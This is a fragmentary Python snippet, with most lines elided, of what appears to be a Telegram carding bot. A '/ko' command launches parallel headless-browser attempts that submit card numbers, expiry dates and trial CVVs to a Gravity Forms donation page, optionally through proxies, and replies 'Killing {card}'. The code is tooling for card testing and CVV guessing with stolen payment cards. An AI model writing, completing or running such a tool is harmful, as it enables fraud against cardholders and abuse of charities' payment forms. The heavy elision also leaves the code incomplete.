...
MAX_CONCURRENT = 3  # RAM bachane ke liye
...
async def attempt_parallel(card, exp_month, exp_year, cvv, attempt_cvv, donor, proxy=None):
    async with async_playwright() as p:
        ...
        try:
            ...
            await page.wait_for_selector("input#input_18_16_1", timeout=15000)
            ...
            async with page.expect_response(lambda r: "gf_ajax" in r.url or "gform" in r.url, timeout=20000) as resp:
...
async def ko_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if len(parts) == 4:
        ...
        if len(tokens) >= 4:
            ...
            return
    await update.message.reply_text(f"⚡ Killing {card} (parallel {MAX_CONCURRENT} at a time)...")
